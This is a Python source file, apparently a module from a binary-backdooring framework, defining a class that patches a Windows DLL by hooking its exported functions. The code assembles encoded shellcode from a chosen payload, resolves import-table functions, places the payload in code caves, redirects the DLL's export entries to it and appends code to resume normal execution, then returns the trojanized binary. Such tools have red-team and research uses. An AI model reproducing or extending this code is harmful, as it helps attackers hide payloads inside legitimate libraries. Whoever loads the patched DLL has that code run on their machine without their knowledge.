import os
import logging
from core import enum
from core import support
import io
from pe.core import core
from common.common import *
logger = logging.getLogger(__name__)
from pe import pe_parse     # delete before shipping

class hook_dll_exports:

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """hook_dll_exports"""
        self.description = """Hook DLL Exports"""
        self.requirements = {'FILE': 'Binary to be patched',
                             'MODE': 'How the patching will happen',
                             'PAYLOAD': 'Payload to be patched into binary',
                             'EXPORTS': 'The APIs you want to hook',
                             'ENCODER': 'Encoder to encode the payload'
                             }

        self.found_encoder = False

    def support_checks(self):
        support_chk = support.support(self)
        # Add more support checks as we go

        if not support_chk.check_reqs():
            return False

        if not support_chk.check_modes():
            return False

        if not support_chk.check_payloads():
            return False

        if not support_chk.check_core():
            return False

        if not support_chk.check_modifier():
            return False

        if not support_chk.check_encoders():
            return False

        return True

    #def patch_cfg_dispatch_fptr(self):
    #    # move this to mode to support chipset
    #    self.BDF.patch_instr

    def patch(self, BDF):
        # self.BDF is passed to inherited classes add class objects if you
        #  want them passed to other classes
        self.BDF = BDF

        self.BDF.core_support = 'dll_core'
        if not self.BDF.pe_object['IsDLL']:
            logger.error(f"Target binary is not a DLL!")
            return False
        # move this to a x64 bit payload for the text_loader recovery

        if not self.support_checks():
            return False

        logger.info("[*] Selected Payload: {0}".format(self.found_payload.__class__.__name__))

        logger.info("[*] Selected Mode: {0}".format(self.found_mode.__class__.__name__))

        self.BDF.found_payload = self.found_payload

        # CALL IAT FUNCTIONS HERE
        if self.BDF.found_payload.apis_needed:
            iat = core.core(self.BDF)
            iat_result = iat.iat_workflow()
            if not iat_result:
                return False

        # Get the shellcode based on the mode
        self.BDF.pe_object['allshells'] = self.BDF.found_payload.invoke(self)

        if self.BDF.pe_object['allshells'] is False:
            return False

        self.BDF.pe_object['shellcode'] = b''.join(self.BDF.pe_object['allshells'])    

        logger.debug(f"self.BDF.pe_object['shellcode'] {self.BDF.pe_object['shellcode']}")
        logger.debug(f"DEBUG SELF: {dir(BDF)}")
        logger.debug(f"self.found_core:  {self.found_core} - {type(self.found_core)}")

        targetFile = self.found_core
        targetFile.BDF = self.BDF
        logger.debug(targetFile)
        self.BDF.pe_object['resumeExe'] = targetFile.resume_execution_dll()
        self.BDF.pe_object['resumeExe_len'] = len(self.BDF.pe_object['resumeExe'])

        shellcode_length = len(self.BDF.pe_object['shellcode'])

        logger.debug(f'shellcode_length: {shellcode_length}')

        self.BDF.pe_object['shellcode_length'] = shellcode_length + len(self.BDF.pe_object['resumeExe'])

        logger.debug(f"self.BDF.pe_object['shellcode_length'] {self.BDF.pe_object['shellcode_length']}")
        logger.debug(f"found_mode: {self.found_mode}")

        self.found_mode.BDF = self.BDF
        found_mode_result = self.found_mode.invoke_mode()

        if not found_mode_result:
            return False
        logger.debug(f"JMPtoCodeAddress before CavesPicked: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        if not targetFile.update_export_apis():
            return False

        logger.debug(f"JMPtoCodeAddress after CavesPicked: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        # recalling resumeExe
        self.BDF.pe_object['resumeExe'] = targetFile.resume_execution_dll()

        # recall the payload to set the initial location for the payload
        self.BDF.pe_object['allshells'] = self.BDF.found_payload.invoke(self)

        if self.BDF.pe_object['allshells'] is False:
            return False

        self.BDF.pe_object['shellcode'] = b''.join(self.BDF.pe_object['allshells'])    
        logger.debug(f"self.BDF.pe_object['shellcode'] {self.BDF.pe_object['shellcode']}")

        self.BDF.pe_object['completeShellcode'] = self.BDF.pe_object['shellcode'] + self.BDF.pe_object['resumeExe']

        self.found_mode.get_patch_instr()

        # Default for a patch_method template
        self.patched_binary = io.BytesIO(self.BDF.original_binary.read(-1))

        patch = support.support(self)
        patch.patch_file()

        result = self.patched_binary

        result.seek(0)

        # Delete before shipping
        parser = pe_parse.pe_parse(FILE=result)

        if parser.run():
            self.BDF.pe_object = parser.__dict__
            result.seek(0)
        else:
            return False
        ######
        return result
